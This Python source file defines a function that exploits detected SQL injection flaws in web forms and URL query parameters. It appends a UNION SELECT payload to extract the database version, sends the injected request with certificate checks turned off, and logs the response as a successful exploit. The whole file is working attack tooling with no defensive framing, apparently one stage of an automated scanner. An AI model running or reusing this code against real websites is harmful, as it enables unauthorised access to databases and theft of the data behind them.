import logging
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def exploit_vulnerability(vulnerability):
    """
    Exploit the detected SQL injection vulnerability.

    Args:
        vulnerability (dict): The detected vulnerability details.
    """
    # Extract necessary details from the vulnerability dict
    if "input_field" in vulnerability:
        action = vulnerability["form_action"]
        method = vulnerability["method"]
        input_name = vulnerability["input_field"]
        payload = vulnerability["payload"]
        logging.info(f"Exploiting SQLi vulnerability found in form action: {action}, field: {input_name} with payload: {payload}")
        
        # Here, for simplicity, we exploit the vulnerability by attempting to extract database version
        # This payload could be modified based on the specific DBMS
        exploit_payload = "' UNION SELECT 1, version() --"
        data = {field["name"]: field["value"] + exploit_payload if field["name"] == input_name else field["value"] for field in vulnerability["inputs"]}

        try:
            if method.lower() == "post":
                response = requests.post(action, data=data, timeout=10, verify=False)
            else:
                response = requests.get(action, params=data, timeout=10, verify=False)

            if response.status_code == 200:
                logging.info(f"Exploit successful! Response: {response.text[:200]}")  # Print part of the response for preview

        except requests.exceptions.RequestException as e:
            logging.error(f"Exploit failed with error: {e}")
            return

    if "parameter" in vulnerability:
        url = vulnerability["url"]
        payload = vulnerability["payload"]
        logging.info(f"Exploiting SQLi vulnerability found in URL parameter: {vulnerability['parameter']} with payload: {payload}")

        exploit_payload = "' UNION SELECT 1, version() --"
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        query_params[vulnerability["parameter"]] = [value + exploit_payload for value in query_params[vulnerability["parameter"]]]

        injected_query = urlencode(query_params, doseq=True)
        injected_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            injected_query,
            parsed_url.fragment
        ))

        try:
            response = requests.get(injected_url, timeout=10, verify=False)

            if response.status_code == 200:
                logging.info(f"Exploit successful! Response: {response.text[:200]}")

        except requests.exceptions.RequestException as e:
            logging.error(f"Exploit failed with error: {e}")
            return
